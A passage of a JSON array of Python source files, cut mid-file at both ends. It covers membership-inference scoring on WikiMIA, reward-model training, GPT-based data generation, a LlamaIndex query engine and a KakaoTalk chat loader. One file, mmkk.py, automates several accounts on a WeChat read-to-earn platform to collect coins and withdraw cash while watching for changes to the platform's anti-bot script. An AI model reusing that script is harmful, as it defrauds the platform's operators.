else:\n        model = AutoModelForCausalLM.from_pretrained(\n            name, return_dict=True, device_map='auto', **int8_kwargs, **half_kwargs\n        )\n    model.eval()\n    tokenizer = AutoTokenizer.from_pretrained(name)\n    return model, tokenizer\n\nmodel, tokenizer = load_model(args.model)\n\n# load dataset\nif not 'paraphrased' in args.dataset:\n    dataset = load_dataset('swj0419/WikiMIA', split=args.dataset)\nelse:\n    dataset = load_dataset('zjysteven/WikiMIA_paraphrased_perturbed', split=args.dataset)\ndata = convert_huggingface_data_to_list_dic(dataset)\n\n# inference - get scores for each input\nscores = defaultdict(list)\nfor i, d in enumerate(tqdm(data, total=len(data), desc='Samples')): \n    text = d['input']\n    \n    input_ids = torch.tensor(tokenizer.encode(text)).unsqueeze(0)\n    input_ids = input_ids.to(model.device)\n    with torch.no_grad():\n        outputs = model(input_ids, labels=input_ids)\n    loss, logits = outputs[:2]\n    ll = -loss.item() # log-likelihood\n\n    # assuming the score is larger for training data\n    # and smaller for non-training data\n    # this is why sometimes there is a negative sign in front of the score\n    \n    # loss and zlib\n    scores['loss'].append(ll)\n    scores['zlib'].append(ll / len(zlib.compress(bytes(text, 'utf-8'))))\n\n    # mink and mink++\n    input_ids = input_ids[0][1:].unsqueeze(-1)\n    probs = F.softmax(logits[0, :-1], dim=-1)\n    log_probs = F.log_softmax(logits[0, :-1], dim=-1)\n    token_log_probs = log_probs.gather(dim=-1, index=input_ids).squeeze(-1)\n    mu = (probs * log_probs).sum(-1)\n    sigma = (probs * torch.square(log_probs)).sum(-1) - torch.square(mu)\n\n    ## mink\n    for ratio in [0.1, 0.2, 0.3, 0.4, 0.5, 0.6, 0.7, 0.8, 0.9, 1.0]:\n        k_length = int(len(token_log_probs) * ratio)\n        topk = np.sort(token_log_probs.cpu())[:k_length]\n        scores[f'mink_{ratio}'].append(np.mean(topk).item())\n    \n    ## mink++\n    mink_plus = (token_log_probs - mu) / sigma.sqrt()\n    for ratio in [0.1, 0.2, 0.3, 0.4, 0.5, 0.6, 0.7, 0.8, 0.9, 1.0]:\n        k_length = int(len(mink_plus) * ratio)\n        topk = np.sort(mink_plus.cpu())[:k_length]\n        scores[f'mink++_{ratio}'].append(np.mean(topk).item())\n\n# compute metrics\n# tpr and fpr thresholds are hard-coded\ndef get_metrics(scores, labels):\n    fpr_list, tpr_list, thresholds = roc_curve(labels, scores)\n    auroc = auc(fpr_list, tpr_list)\n    fpr95 = fpr_list[np.where(tpr_list >= 0.95)[0][0]]\n    tpr05 = tpr_list[np.where(fpr_list <= 0.05)[0][-1]]\n    return auroc, fpr95, tpr05\n\nlabels = [d['label'] for d in data] # 1: training, 0: non-training\nresults = defaultdict(list)\nfor method, scores in scores.items():\n    auroc, fpr95, tpr05 = get_metrics(scores, labels)\n    \n    results['method'].append(method)\n    results['auroc'].append(f\"{auroc:.1%}\")\n    results['fpr95'].append(f\"{fpr95:.1%}\")\n    results['tpr05'].append(f\"{tpr05:.1%}\")\n\ndf = pd.DataFrame(results)\nprint(df)\n\nsave_root = f\"results/{args.dataset}\"\nif not os.path.exists(save_root):\n    os.makedirs(save_root)\n\nmodel_id = args.model.split('/')[-1]\nif os.path.isfile(os.path.join(save_root, f\"{model_id}.csv\")):\n    df.to_csv(os.path.join(save_root, f\"{model_id}.csv\"), index=False, mode='a', header=False)\nelse:\n    df.to_csv(os.path.join(save_root, f\"{model_id}.csv\"), index=False)",
    "# Inspired by: https://github.com/CarperAI/trlx/blob/main/examples/summarize_rlhf/reward_model/train_reward_model_gptj.py\n\nfrom typing import TYPE_CHECKING, Optional, List\nfrom transformers import Seq2SeqTrainingArguments\n\nfrom llmtuner.data import get_dataset, preprocess_dataset, split_dataset\nfrom llmtuner.extras.callbacks import FixValueHeadModelCallback\nfrom llmtuner.extras.misc import fix_valuehead_checkpoint\nfrom llmtuner.extras.ploting import plot_loss\nfrom llmtuner.model import load_model_and_tokenizer\nfrom llmtuner.train.rm.collator import PairwiseDataCollatorWithPadding\nfrom llmtuner.train.rm.metric import compute_accuracy\nfrom llmtuner.train.rm.trainer import PairwiseTrainer\nfrom llmtuner.train.utils import create_modelcard_and_push\n\nif TYPE_CHECKING:\n    from transformers import TrainerCallback\n    from llmtuner.hparams import ModelArguments, DataArguments, FinetuningArguments\n\n\ndef run_rm(\n    model_args: \"ModelArguments\",\n    data_args: \"DataArguments\",\n    training_args: \"Seq2SeqTrainingArguments\",\n    finetuning_args: \"FinetuningArguments\",\n    callbacks: Optional[List[\"TrainerCallback\"]] = None\n):\n    dataset = get_dataset(model_args, data_args)\n    model, tokenizer = load_model_and_tokenizer(model_args, finetuning_args, training_args.do_train, add_valuehead=True)\n    dataset = preprocess_dataset(dataset, tokenizer, data_args, training_args, stage=\"rm\")\n    data_collator = PairwiseDataCollatorWithPadding(tokenizer, pad_to_multiple_of=8)\n\n    # Update arguments\n    training_args_dict = training_args.to_dict()\n    training_args_dict.update(dict(remove_unused_columns=False)) # important for pairwise dataset\n    training_args = Seq2SeqTrainingArguments(**training_args_dict)\n\n    # Initialize our Trainer\n    trainer = PairwiseTrainer(\n        model=model,\n        args=training_args,\n        tokenizer=tokenizer,\n        data_collator=data_collator,\n        callbacks=callbacks + [FixValueHeadModelCallback()],\n        compute_metrics=compute_accuracy,\n        **split_dataset(dataset, data_args, training_args)\n    )\n\n    # Training\n    if training_args.do_train:\n        train_result = trainer.train(resume_from_checkpoint=training_args.resume_from_checkpoint)\n        trainer.save_model()\n        if training_args.should_save:\n            fix_valuehead_checkpoint(model, training_args.output_dir, training_args.save_safetensors)\n        trainer.log_metrics(\"train\", train_result.metrics)\n        trainer.save_metrics(\"train\", train_result.metrics)\n        trainer.save_state()\n        if trainer.is_world_process_zero() and finetuning_args.plot_loss:\n            plot_loss(training_args.output_dir, keys=[\"loss\", \"eval_loss\"])\n\n    # Evaluation\n    if training_args.do_eval:\n        metrics = trainer.evaluate(metric_key_prefix=\"eval\")\n        trainer.log_metrics(\"eval\", metrics)\n        trainer.save_metrics(\"eval\", metrics)\n\n    # Predict\n    if training_args.do_predict:\n        predict_results = trainer.predict(dataset, metric_key_prefix=\"predict\")\n        trainer.log_metrics(\"predict\", predict_results.metrics)\n        trainer.save_metrics(\"predict\", predict_results.metrics)\n        trainer.save_predictions(predict_results)\n\n    # Create model card\n    create_modelcard_and_push(trainer, model_args, data_args, training_args, finetuning_args)\n",
    "# %%\nimport time\nimport jsonlines\nfrom src import MyOpenAI, Prompts\nfrom concurrent.futures import ThreadPoolExecutor, as_completed\n\nkwargs = {\n    \"max_tokens\": 2048,\n    \"temperature\": 2.0,\n    \"top_p\": 1,\n    \"frequency_penalty\": 0,\n    \"presence_penalty\": 1.0,\n    \"stop\": [],\n}\nn_workers = 8\n\n\n# %%\ndef generate_translational_dialogue(dialogue):\n    global response\n    dialogue.pop(\"topic\", None)\n    user_input = Prompts.prompt3(dialogue)\n    messages = [{\"role\": \"system\", \"content\": user_input}]\n    try:\n        response = MyOpenAI.chat(messages, kwargs)\n        dialogue = MyOpenAI.parse(response)\n        dialogue = eval(dialogue)\n        if isinstance(dialogue, dict) and \"\u95ee\" in dialogue and \"\u7b54\" in dialogue:\n            return dialogue\n    except Exception as e:\n        return f\"Error: {e}\", response\n\n\n# %%\ntranslational_dialogues = []\nerrors = []\nwith jsonlines.open(\"GPTGenerateData/2_Dialogues.jsonl\") as reader:\n    dialogues = [dialogue for dialogue in reader]\n\nwith ThreadPoolExecutor(max_workers=n_workers) as executor:\n    futures = [executor.submit(generate_translational_dialogue, dialogue) for dialogue in dialogues]\n    start = time.time()\n    for future in as_completed(futures):\n        res = future.result()\n        if isinstance(res, dict):\n            translational_dialogues.append(res)\n            end = time.time()\n            print(\n                f\"Generated {len(translational_dialogues)} translational dialogues. \"\n                f\"Time elapsed: {end - start:.2f}s\"\n            )\n        else:\n            e, response = res\n            errors.append(response)\n            print(e)\n\n# %%\nwith jsonlines.open(\"GPTGenerateData/3_TranslationalDialogues.jsonl\", \"w\") as writer:\n    for res in translational_dialogues:\n        writer.write(res)\n\n# %%\nwith jsonlines.open(\"GPTGenerateData/Errors_TranslationalDialogues.jsonl\", \"w\") as writer:\n    for res in errors:\n        writer.write(str(res))\n",
    "# -*- coding: utf-8 -*-\n# mmkk.py created by MoMingLog on 28/3/2024.\n\"\"\"\n\u3010\u4f5c\u8005\u3011MoMingLog\n\u3010\u521b\u5efa\u65f6\u95f4\u30112024-03-28\n\u3010\u529f\u80fd\u63cf\u8ff0\u3011\n\"\"\"\nimport json\nimport logging\nimport random\nimport re\nimport sys\nfrom http.cookies import SimpleCookie\nfrom urllib.parse import urlparse\n\nimport httpx\nfrom pydantic import ValidationError\n\nfrom config import load_mmkk_config\nfrom exception.mmkk import ReadValid, FailedFetchUK, FailedFetchArticleJSUrl, FailedFetchArticleJSVersion, \\\n    ArticleJSUpdated, CodeChanged, FailedFetchReadUrl, StopRun, PauseReading, ReachedLimit, StopRunWithShowMsg\nfrom schema.mmkk import WorkInfoRsp, UserRsp, WTMPDomainRsp, MKWenZhangRsp, AddGoldsRsp, MMKKConfig, MMKKAccount\nfrom utils import *\nfrom utils.push_utils import WxPusher\n\nlogger = Logger(\"\ud83d\ude38\u9605\u8bfb\")\n\n\nclass APIS:\n    # \u901a\u7528\u524d\u7f00\u8def\u5f84\n    COMMON = \"/haobaobao\"\n\n    # API: \u7528\u6237\u4fe1\u606f\n    USER = f\"{COMMON}/user\"\n    # API: \u4eca\u65e5\u9605\u8bfb\u7edf\u8ba1\n    WORKINFO = f\"{COMMON}/workinfo\"\n    # API: \u4e8c\u7ef4\u7801\u76f8\u5173\u4fe1\u606f\n    WTMPDOMAIN = f\"{COMMON}/wtmpdomain2\"\n    # API: \u83b7\u53d6\u9605\u8bfb\u6587\u7ae0\n    MKWENZHANGS = f\"{COMMON}/mkwenzhangs\"\n    # API: \u9605\u8bfb\u6210\u529f\u540e\u589e\u52a0\u91d1\u5e01\n    ADDGOLDS = f\"{COMMON}/addgolds2\"\n    # API: \u63d0\u73b0\u9875\u9762\n    WITHDRAW = f\"{COMMON}/withdraw\"\n    # API: \u5c06\u91d1\u5e01\u5151\u6362\u4e3a\u4eba\u6c11\u5e01\n    GETGOLD = f\"{COMMON}/getgold\"\n    # API: \u5c06\u4eba\u6c11\u5e01\u8fdb\u884c\u63d0\u73b0\n    GETWITHDRAW = f\"{COMMON}/getwithdraw\"\n\n\nclass MMKK:\n    \"\"\"\u732b\u732b\u770b\u770b\u9605\u8bfb\"\"\"\n    # TODO: \u8bb0\u5f97\u4fee\u6539\u8fd9\u91cc\u7684\u56fa\u5b9a\u7248\u672c\u53f7\n    # \u4e0a\u9762\u7684TODO \u4e3b\u8981\u7528\u4e8e\u63d0\u9192\u6211\u4e0a\u4f20\u7684\u65f6\u5019\u66f4\u6539\u7248\u672c\u53f7\n    # \u5f53\u524d\u811a\u672c\u7248\u672c\u53f7\n    CURRENT_SCRIPT_VERSION = \"1.0.2\"\n    # \u5f53\u524d\u811a\u672c\u4f5c\u8005\n    CURRENT_SCRIPT_AUTHOR = \"MoMingLog\"\n    # \u811a\u672c\u66f4\u65b0\u65f6\u95f4\n    CURRENT_SCRIPT_UPDATED = \"2024-04.04\"\n\n    # \u5f53\u524d\u811a\u672c\u9002\u914d\u7684\u7248\u672c\u53f7\n    CURRENT_ARTICLE_JS_VERSION = \"11.0\"\n    # \u5f53\u524d\u811a\u672c\u9002\u914d\u7684\u57fa\u672c\u94fe\u63a5\n    ARTICLE_JS_DOMAIN = \"https://nsr.zsf2023e458.cloud\"\n    # \u5f53\u524d\u811a\u672c\u9002\u914d\u7684V\n    ARTICLE_JS_V = \"6.0\"\n    # \u5f53\u524d\u811a\u672c\u9002\u914d\u7684js\u6587\u4ef6md5\u503c\n    ARTICLE_JS_CODE_MD5 = \"0674299674c2c54e4c9c8111012552a7\"\n    # \u56fa\u5b9a\u7684\u52a0\u5bc6\u62fc\u63a5\u7684\u5b57\u7b26\u4e32\n    ARTICLE_MD5_FIX_STR = \"Lj*?Q3#pOviW\"\n\n    # \u83b7\u53d6ejectCode\u7684\u6b63\u5219\n    EJECTCODE_COMPILE = re.compile(r\"setCookie.*?ejectCode.*?(\\d+)'\", re.S)\n    # \u83b7\u53d6 request_id\n    WITHDRAW_REQ_ID_COMPILE = re.compile(r\"request_id\\s*=\\s*['\\\"](.*?)['\\\"]\")\n    # \u83b7\u53d6\u7248\u672c\u53f7\u7684\u6b63\u5219\n    ARTICLE_JS_COMPILE = re.compile(r\"<script(?!.*?(?:jquery|md5)).*?v(\\d+\\.\\d+).*?script>\", re.S)\n    # \u83b7\u53d6script\u7684src\u5c5e\u6027\u94fe\u63a5\n    ARTICLE_JS_SRC_COMPILE = re.compile(r\"src\\s*=\\s*['\\\"](.*?)['\\\"]\", re.S)\n    # \u83b7\u53d6article.js\u4e2d\u7684 schema + domain\n    ARTICLE_JS_DOMAIN_COMPILE = re.compile(r\"function\\sread_jump_read.*?url['\\\"]:['\\\"](https?://.*?)/\", re.S)\n    # \u83b7\u53d6article.js\u4e2d\u7684v\u53c2\u6570\n    ARTICLE_JS_V_COMPILE = re.compile(r\"v=(\\d+\\.\\d+)&uk\", re.S)\n    # \u68c0\u6d4b\u6709\u6548\u9605\u8bfb\u94fe\u63a5\n    ARTICLE_LINK_VALID_COMPILE = re.compile(\n        r\"^https?://mp.weixin.qq.com/s\\?__biz=[^&]*&mid=[^&]*&idx=\\d*&(?!.*?chksm).*?&scene=\\d*#wechat_redirect$\")\n    # \u63d0\u53d6\u9605\u8bfb\u6587\u7ae0\u94fe\u63a5\u7684__biz\u503c\n    ARTICLE_LINK_BIZ_COMPILE = re.compile(r\"__biz=(.*?)&\")\n\n    def __init__(self, config_data: MMKKConfig = load_mmkk_config()):\n        self.mmkk_config_data = config_data\n\n        if config_data.debug:\n            logger.set_console_level(logging.DEBUG)\n\n        self.accounts = config_data.account_data\n\n        logger.info(f\"\u3010\u811a\u672c\u4fe1\u606f\u3011\\n> \u4f5c\u8005\uff1a{self.CURRENT_SCRIPT_AUTHOR}\\n> \u7248\u672c\u53f7\uff1a{self.CURRENT_SCRIPT_VERSION}\\n\")\n        logger.info(\n            f\"\u3010\u4efb\u52a1\u914d\u7f6e\u4fe1\u606f\u3011\\n> \u8d26\u53f7\u6570\u91cf\uff1a{len(self.accounts)}\\n> \u8d26\u53f7\u961f\u5217: {[name for name in self.accounts.keys()]}\\n> \u914d\u7f6e\u6765\u6e90: {config_data.source}\\n\")\n        # # \u57fa\u672c\u94fe\u63a5\uff08schema://netloc\uff09\u4e0d\u5305\u542b\u8def\u5f84\n        # self.base_url = None\n        # \u6784\u5efa\u57fa\u672c\u8bf7\u6c42\u5934\n        self.base_headers = self.__build_base_headers()\n        # \u521d\u59cb\u5ba2\u6237\u7aef\uff08\u4e0d\u5305\u62ecbase_url\uff09\n        self.empty_client = httpx.Client(headers=self.base_headers, timeout=30)\n        # \u6784\u5efa\u57fa\u672c\u5ba2\u6237\u7aef\n        self.base_client = httpx.Client(headers=self.base_headers, timeout=30)\n        # \u6784\u5efa\u9605\u8bfb\u5ba2\u6237\u7aef\n        self.read_client = httpx.Client(headers=self.base_headers, timeout=30)\n        # \u6784\u5efa\u63d0\u73b0\u5ba2\u6237\u7aef\n        self.withdraw_client = httpx.Client(timeout=30)\n        # \u76ee\u524d\u9ed8\u8ba4\u4e3a1\uff0c\u4e0d\u77e5\u9053\u4f5c\u7528\uff0c\u751f\u6548\u65f6\u95f410\u5206\u949f\uff0c\u4e0e\u540e\u7eed\u7684cookie\u7ed1\u5b9a\u5728\u4e00\u8d77\n        self.ejectCode = \"1\"\n        # \u904d\u5386\u6240\u6709\u7528\u6237\u6570\u636e\n        for name, account_config in self.accounts.items():\n            logger.set_tag(name)\n            self.uk = None\n            self.name = name\n            # \u83b7\u53d6\u7528\u6237\u914d\u7f6e\n            self.account_config: MMKKAccount = account_config\n            # \u89e3\u6790\u5e76\u8bbe\u7f6e\u7528\u6237cookie\n            self.base_client.cookies = self.__parse_cookie(self.account_config.cookie)\n            msg_list = [\n                f\"\u3010\u8d26\u53f7\u914d\u7f6e\u4fe1\u606f\u3011\",\n                f\"> \u8d26\u53f7\u540d\u79f0\uff1a{name}\",\n                f\"> \u63d0\u73b0\u65b9\u5f0f\uff1a{self.withdraw_way}\",\n            ]\n            if self.wx_pusher_uid:\n                msg_list.append(f\"> \u63a8\u9001uid\uff1a{self.wx_pusher_uid}\")\n            if self.wx_pusher_topicIds:\n                msg_list.append(f\"> \u63a8\u9001topicIds\uff1a{self.wx_pusher_topicIds}\")\n\n\n            logger.info(\"\\n\".join(msg_list))\n            logger.info(\"\u8bf7\u68c0\u67e5\u914d\u7f6e\u662f\u5426\u6b63\u786e\uff0c\u4efb\u52a1\u5373\u5c063\u79d2\u540e\u5f00\u59cb...\")\n            time.sleep(3)\n            # # \u521d\u59cb\u5316\u94fe\u63a5\n            # self.__init_userinfo()\n            self.run()\n\n        self.empty_client.close()\n        self.base_client.close()\n        self.read_client.close()\n        self.withdraw_client.close()\n\n    def run(self):\n        print(f\"\u3010{self.name}\u3011\u4efb\u52a1\u5f00\u59cb\".center(50, \"-\"))\n        is_withdraw = False\n      ",
    "import json\nimport os\nfrom tqdm import tqdm\nfrom concurrent.futures import ThreadPoolExecutor\nimport argparse\nfrom utils import get_prompt\nfrom openai import OpenAI\n\nMAX_API_RETRY = 5\nAPI_KEY = os.environ[\"OPENAI_API_KEY\"]\n\ndef get_response(query, item, prompt):\n    tmp_save = {\n        'constrainted_questions': {}\n    }\n    for k, v in item.items():\n        if k != 'constrainted_questions':\n            tmp_save[k] = v\n\n    client = OpenAI(api_key=API_KEY)\n    for diff, question in item['constrainted_questions'].items():\n        for _ in range(MAX_API_RETRY):\n            try:\n                prompt_ = prompt % question\n                response = client.chat.completions.create(\n                    model='gpt-4-turbo-preview',\n                    max_tokens=1,\n                    temperature=0.0,\n                    messages=[{\n                        'role': 'user',\n                        'content': prompt_,\n                    }],\n                )\n                content = response.choices[0].message.content\n            except Exception as e:\n                print(f\"failed...{e}\")\n                continue\n            content = content.lower().strip()\n            if \"yes\" in content:\n                tmp_save['constrainted_questions'][diff] = question\n            break\n    return query, tmp_save\n    \n\ndef main(args):\n    # load input queries\n    for suffix in ['', '_format_number']:\n        input_file = os.path.join(args.dir, f\"04_constrainted_question{suffix}.json\")\n        output_file = os.path.join(args.dir, f\"05_constrainted_question{suffix}_filtered.json\")\n\n        constrainted_question = json.load(open(input_file, \"r\"))\n        constrainted_question_filtered = {}\n\n        # load prompt\n        prompt = get_prompt(\"second stage filter\")\n\n        # load saved samples\n        dedup_set = set()\n        try:\n            with open(output_file, \"r\") as f:\n                constrainted_question_filtered = json.load(f)\n                dedup_set = set(constrainted_question_filtered.keys())\n        except:\n            pass\n\n        passed_args = []\n        for query, item in constrainted_question.items():\n            if query in dedup_set:\n                continue\n            passed_args.append((query, item, prompt))\n        \n        with ThreadPoolExecutor(max_workers=args.worker) as executor:\n            for save_count, future in enumerate(tqdm(executor.map(get_response, *zip(*passed_args)), total=len(passed_args))):\n                if future is not None:\n                    query, tmp_save = future\n                    constrainted_question_filtered[query] = tmp_save\n                    if save_count % args.save_iterval == 0:\n                        with open(output_file, \"w\") as f:\n                            json.dump(constrainted_question_filtered, f, ensure_ascii=False, indent=4)\n                        print(f\"File Saved\")\n        \n        with open(output_file, \"w\") as f:\n            json.dump(constrainted_question_filtered, f, ensure_ascii=False, indent=4)\n        print(f\"File Saved\")\n\n\nif __name__ == \"__main__\":\n    parser = argparse.ArgumentParser()\n    parser.add_argument(\"--dir\", type=str, help=\"input file path for sentences\", default=\"conifer_data\")\n    parser.add_argument(\"--save-iterval\", type=int, help=\"save to file after generating K samples\", default=2)\n    parser.add_argument(\"--worker\", type=int, help=\"number of concurrent workers\", default=1)\n    args = parser.parse_args()\n    main(args)",
    "import json\nimport traceback\nfrom typing import Any, Dict, Tuple\nfrom collections import Counter\nfrom dataclasses import dataclass\nfrom llama_index.core.base.response.schema import PydanticResponse\nfrom llama_index.core.prompts import PromptTemplate\nfrom llama_index.core import Settings, VectorStoreIndex\nfrom llama_index.core.retrievers import QueryFusionRetriever\nfrom llama_index.core.query_engine import RetrieverQueryEngine\nfrom llama_index.core.llms.llm import LLM\nfrom llama_index.program.openai import OpenAIPydanticProgram\nfrom . import ROOT\nfrom .templates import (\n    PROMPT_EVAL,\n    PROMPT_RETRY,\n    PROMPT_DOCUMENTATION,\n    PROMPT_INPUT_PARAMETER,\n    PROMPT_OUTPUT_PARAMETER,\n    PROMPT_PYTHON_DTYPE,\n    PROMPT_INFRA_TYPE,\n    TEXT_QA_PROMPTS,\n    eval_questions,\n    create_eval_schema,\n    Node,\n)\nfrom .utils import update_node_info, format_response, id_to_node, node_to_id\n\n\n@dataclass\nclass EvaluatedResponse:\n    response: PydanticResponse | None = None\n    score: int = -1\n    feedback: str | None = None\n    passing: bool = False\n\n\nclass NodeQueryEngine:\n    \"\"\"\n    Implements advanced querying for node documentation.\n    Process includes retrieveing context from code database, querying llm with structured output guidance,\n    self correcting via evaluation, refining query with evaluation output, obtaining node usage info from pipelines database,\n    postprocessing and formatting output into the desired format.\n    Querying works iteratively until num_retries is reached or response is satisfactory.\n    \"\"\"\n\n    def __init__(self, indexes: VectorStoreIndex, num_retries: int, top_k: int) -> None:\n        retrievers = [index.as_retriever(similarity_top_k=top_k) for index in indexes]\n        retriever = QueryFusionRetriever(retrievers=retrievers, similarity_top_k=top_k, num_queries=1)\n        self.engine = RetrieverQueryEngine.from_args(retriever, text_qa_template=TEXT_QA_PROMPTS)\n        self.max_score = len(eval_questions) * 5\n        self.evaluator = StructuredEvaluator(eval_template=PROMPT_EVAL, score_threshold=self.max_score)\n        self.num_retries = num_retries\n\n    def query(self, node_name: str, node_info: Dict[str, Any]) -> Dict[str, Any]:\n        node_info = update_node_info(node_info)\n        inputs_str = str([k for d in node_info[\"input_parameters\"].values() for k in d.keys()])\n        outputs_str = str(list(node_info[\"output_parameters\"].keys()))\n        Evaluation = create_eval_schema(\n            prompt_documentation=PROMPT_DOCUMENTATION,\n            prompt_input_parameter=PROMPT_INPUT_PARAMETER,\n            prompt_output_parameter=PROMPT_OUTPUT_PARAMETER,\n            prompt_python_dtype=PROMPT_PYTHON_DTYPE,\n            prompt_infra_type=PROMPT_INFRA_TYPE,\n            node_name=node_name,\n            input_parameters=inputs_str,\n            output_parameters=outputs_str,\n        )\n        Node.format_field_description(\"input_types\", input_parameters=inputs_str)\n        Node.format_field_description(\"output_types\", output_parameters=outputs_str)\n        self.engine._response_synthesizer._output_cls = Node\n        self.evaluator.llm_program._output_cls = Evaluation\n        query = f\"Analyze node {node_name}.\"\n        error = None\n        best_response = EvaluatedResponse()\n        for _ in range(self.num_retries):\n            try:\n                response = self.engine.query(query)\n                evaluated_response = self.evaluator.evaluate_response(response)\n            except Exception:\n                error = traceback.format_exc()\n                continue\n            error = None\n            if evaluated_response.score > best_response.score:\n                best_response = evaluated_response\n            if evaluated_response.passing:\n                response = format_response(\n                    node_name, response, node_info, f\"{evaluated_response.score}/{self.max_score}\"\n                )\n                response = self.generate_usage_information(response)\n                self.reset()\n                return response\n            query = PROMPT_RETRY.format(response=best_response.response, feedback=best_response.feedback)\n        if error is not None and best_response.response is None:\n            self.reset()\n            return {\"_debug_info\": {\"_eval_score\": f\"0/{self.max_score}\", \"_has_unknown\": True, \"_error\": error}}\n        response = format_response(\n            node_name, best_response.response, node_info, f\"{int(best_response.score)}/{self.max_score}\"\n        )\n        response = self.generate_usage_information(response)\n        self.reset()\n        return response\n\n    def generate_usage_information(self, response: Dict[str, Any], most_common: int = 10, max_pipelines: int = 10):\n        common_nodes = []\n        with open(ROOT / \"data\" / \"pipelines_db.json\", \"r\") as file:\n            json_data = json.load(file)\n        for json_value in json_data:\n            # Look for nodes that are frequently used with this node\n            current_pipeline = json.loads(json_value[\"",
    "from typing import Iterator\nfrom langchain_core.documents import Document\nfrom langchain_community.document_loaders.helpers import detect_file_encodings\nimport pandas as pd\nfrom langchain_community.document_loaders import CSVLoader\nimport re\nimport csv\nfrom datetime import datetime\n\n\nclass KaKaoTalkCSVLoader(CSVLoader):\n    def __init__(self, file_path: str, encoding: str = \"utf8\", **kwargs):\n        super().__init__(file_path, encoding=encoding, **kwargs)\n\n    def anonymize_user_id(self, user_id, num_chars_to_anonymize=3):\n        \"\"\"\n        \ube44\uc2dd\ubcc4\ud654 \ud568\uc218\ub294 \uc8fc\uc5b4\uc9c4 \uc0ac\uc6a9\uc790 ID\uc758 \uc55e\ubd80\ubd84\uc744 '*'\ub85c \ub300\uccb4\ud558\uc5ec \ube44\uc2dd\ubcc4\ud654\ud569\ub2c8\ub2e4.\n\n        :param user_id: \ube44\uc2dd\ubcc4\ud654\ud560 \uc0ac\uc6a9\uc790 ID\n        :param num_chars_to_anonymize: \ube44\uc2dd\ubcc4\ud654\ud560 \ubb38\uc790 \uc218\n        :return: \ube44\uc2dd\ubcc4\ud654\ub41c \uc0ac\uc6a9\uc790 ID\n        \"\"\"\n        # \ube44\uc2dd\ubcc4\ud654\ud560 \ubb38\uc790 \uc218\uac00 \uc0ac\uc6a9\uc790 ID\uc758 \uae38\uc774\ubcf4\ub2e4 \uae38 \uacbd\uc6b0, \uc804\uccb4 ID\ub97c '*'\ub85c \ub300\uccb4\n        if num_chars_to_anonymize >= len(user_id):\n            num_chars_to_anonymize = len(user_id) - 1\n            return \"*\" * num_chars_to_anonymize\n\n        # \uc55e\ubd80\ubd84\uc744 '*'\ub85c \ub300\uccb4\ud558\uace0 \ub098\uba38\uc9c0 \ubd80\ubd84\uc744 \uc6d0\ubcf8 ID\uc5d0\uc11c \uac00\uc838\uc634\n        anonymized_id = \"*\" * num_chars_to_anonymize + user_id[num_chars_to_anonymize:]\n\n        return anonymized_id\n\n    @staticmethod\n    def is_relevant_message(message: str) -> bool:\n        \"\"\"\uba54\uc2dc\uc9c0\uac00 \uc785\uc7a5 \ub610\ub294 \ud1f4\uc7a5 \uad00\ub828 \uba54\uc2dc\uc9c0\uc778\uc9c0 \ud655\uc778\ud569\ub2c8\ub2e4.\"\"\"\n        if \"\ub2d8\uc774 \ub4e4\uc5b4\uc654\uc2b5\ub2c8\ub2e4.\" in message or \"\ub2d8\uc774 \ub098\uac14\uc2b5\ub2c8\ub2e4.\" in message:\n            return False  # \uc785\uc7a5 \ub610\ub294 \ud1f4\uc7a5 \uba54\uc2dc\uc9c0\uc778 \uacbd\uc6b0\n        return True  # \uadf8\ub807\uc9c0 \uc54a\uc740 \uacbd\uc6b0\n\n    def __read_file(self, csvfile) -> Iterator[Document]:\n        df = pd.read_csv(csvfile)\n        df[\"Date\"] = pd.to_datetime(df[\"Date\"])\n        df[\"Date_strf\"] = df[\"Date\"].dt.strftime(\"%Y-%m-%d %H:%M:%S\").astype(str)\n        for i, row in df.iterrows():\n            is_relevant = KaKaoTalkCSVLoader.is_relevant_message(row[\"Message\"])\n            if not is_relevant:\n                continue\n            date = row[\"Date\"]\n            user = self.anonymize_user_id(row[\"User\"])\n            content = f'\"User: {user}, Message: {row[\"Message\"]}'\n\n            metadata = {\n                \"date\": row[\"Date_strf\"],\n                \"year\": date.year,\n                \"month\": date.month,\n                \"day\": date.day,\n                \"user\": user,\n                \"row\": i,\n                \"source\": str(self.file_path),\n            }\n            yield Document(page_content=content, metadata=metadata)\n\n    def lazy_load(self) -> Iterator[Document]:\n        try:\n            with open(self.file_path, newline=\"\", encoding=self.encoding) as csvfile:\n                yield from self.__read_file(csvfile)\n        except UnicodeDecodeError as e:\n            if self.autodetect_encoding:\n                detected_encodings = detect_file_encodings(self.file_path)\n                for encoding in detected_encodings:\n                    try:\n                        with open(\n                            self.file_path, newline=\"\", encoding=encoding.encoding\n                        ) as csvfile:\n                            yield from self.__read_file(csvfile)\n                            break\n                    except UnicodeDecodeError:\n                        continue\n            else:\n                raise RuntimeError(f\"Error loading {self.file_path}\") from e\n        except Exception as e:\n            raise RuntimeError(f\"Error loading {self.file_path}\") from e\n\n\nclass KakaoTalkText2CSVConverter:\n    def __init__(self, filepath: str):\n        self.filepath = filepath\n\n    @staticmethod\n    def convert_datetime(date_str, time_str):\n        \"\"\"\ub0a0\uc9dc\uc640 \uc2dc\uac04 \ubb38\uc790\uc5f4\uc744 \ud30c\uc2f1\ud558\uc5ec 'YYYY-MM-DD HH:MM:SS' \ud615\uc2dd\uc758 \ubb38\uc790\uc5f4\ub85c \ubcc0\ud658\ud569\ub2c8\ub2e4.\"\"\"\n        date_formatted = datetime.strptime(date_str.strip(\",\"), \"%Y. %m. %d\").date()\n        if \"\uc624\ud6c4\" in time_str:\n            hour, minute = map(int, time_str.replace(\"\uc624\ud6c4 \", \"\").split(\":\"))\n            hour = hour + 12 if hour < 12 else hour\n        else:\n            hour, minute = map(int, time_str.replace(\"\uc624\uc804 \", \"\").split(\":\"))\n        new_time = f\"{hour:02d}:{minute:02d}:00\"\n        return f\"{date_formatted} {new_time}\"\n\n    def process_final_chat_to_csv(self, chat_lines):\n        \"\"\"\ucc44\ud305 \ub85c\uadf8\ub97c \ubd84\uc11d\ud558\uc5ec CSV \ud615\uc2dd\uc73c\ub85c \ubcc0\ud658\ub41c \ub370\uc774\ud130\ub97c \ub9ac\uc2a4\ud2b8\ub85c \ubc18\ud658\ud569\ub2c8\ub2e4.\"\"\"\n        new_message_pattern = re.compile(\n            r\"(\\d{4}\\.\\s\\d{1,2}\\.\\s\\d{1,2})\\.\\s(\uc624\uc804|\uc624\ud6c4)\\s(\\d{1,2}:\\d{2}),\\s([^:]+)\\s:\"\n        )\n        system_message_pattern = re.compile(\n            